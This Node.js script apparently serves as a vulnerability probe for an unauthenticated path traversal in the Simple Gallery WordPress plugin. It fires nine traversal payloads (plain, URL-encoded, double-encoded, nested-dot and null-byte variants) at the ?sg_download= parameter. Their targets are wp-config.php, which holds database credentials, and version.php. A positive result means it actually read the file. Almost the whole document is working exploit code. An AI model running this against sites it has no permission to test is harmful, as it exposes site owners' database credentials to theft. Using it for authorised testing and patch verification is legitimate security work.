#!/usr/bin/env node
// Verification probe: Simple Gallery <= 2.0.0 unauthenticated path traversal
// via the ?sg_download= parameter (arbitrary file read).
//
// Usage: node probe.mjs <base-url>
// Exit codes: 0 = vulnerable (a traversal variant read a known file)
//             1 = not vulnerable (no variant returned the target content)
//             2 = usage error (missing/invalid base URL)
//
// Only GET requests are sent, and only to the origin of <base-url>.
// Nothing on the target is modified, so there is no state to restore.

const arg = process.argv[2];
if (!arg) {
  console.error('usage: node probe.mjs <base-url>');
  process.exit(2);
}

let base;
try {
  base = new URL(arg);
} catch {
  console.error(`invalid base URL: ${arg}`);
  process.exit(2);
}
if (base.protocol !== 'http:' && base.protocol !== 'https:') {
  console.error(`unsupported protocol: ${base.protocol}`);
  process.exit(2);
}

// Keep the request on the same origin; only the optional path prefix is kept.
const prefix = base.origin + base.pathname.replace(/\/+$/, '');
const endpoint = prefix + '/?sg_download=';

// Known files relative to the WordPress root, with a content marker each.
// The marker must be present in the real file, so a 404/HTML page cannot match.
const targets = [
  { file: 'wp-config.php', marker: /define\s*\(\s*'DB_NAME'/ },
  { file: 'wp-includes/version.php', marker: /\$wp_version\s*=/ },
];

// Payload templates. {T} is replaced by the target file path.
// The upload dir is wp-content/uploads/simple-gallery/, which is 3 levels below
// the WordPress root, so the traversal prefix needs at least three ".." steps.
const payloadTemplates = [
  '../../../{T}',                                  // plain traversal
  '..%2F..%2F..%2F{T}',                            // encoded slash
  '%2e%2e%2f%2e%2e%2f%2e%2e%2f{T}',                // fully encoded dots and slashes
  '..%5C..%5C..%5C{T}',                            // backslash (Windows-style separator)
  '....//....//....//{T}',                         // nested dots, for single-pass "../" strip filters
  '..%252F..%252F..%252F{T}',                      // double-encoded slash, for double-decode bugs
  '../../../../../../../../{T}',                    // deep traversal, for depth/limit checks
  '../../../{T}%00.svg',                           // null byte before an allowed extension
  '..%2F..%2F..%2F{T}%00.svg',                     // encoded slash plus null byte
];

async function probeOne(payload, marker) {
  const url = endpoint + payload;
  let res;
  try {
    res = await fetch(url, {
      method: 'GET',
      redirect: 'manual',
      signal: AbortSignal.timeout(10000),
    });
  } catch (err) {
    return { hit: false, status: 'error', detail: String(err && err.message) };
  }
  const body = await res.text();
  const hit = res.status === 200 && marker.test(body);
  return { hit, status: res.status, detail: '' };
}

let vulnerable = false;
let hitDescription = '';

for (const t of targets) {
  for (const tpl of payloadTemplates) {
    const payload = tpl.split('{T}').join(t.file);
    const r = await probeOne(payload, t.marker);
    const label = `${t.file} via ${payload}`;
    if (r.hit) {
      console.log(`[VULN] HTTP ${r.status}  ${label}`);
      if (!vulnerable) {
        vulnerable = true;
        hitDescription = label;
      }
    } else {
      const extra = r.detail ? ` (${r.detail})` : '';
      console.log(`[ no ] HTTP ${r.status}  ${label}${extra}`);
    }
  }
}

if (vulnerable) {
  console.log(`RESULT: VULNERABLE (first hit: ${hitDescription})`);
  process.exit(0);
} else {
  console.log('RESULT: NOT VULNERABLE (no traversal variant returned a known file)');
  process.exit(1);
}
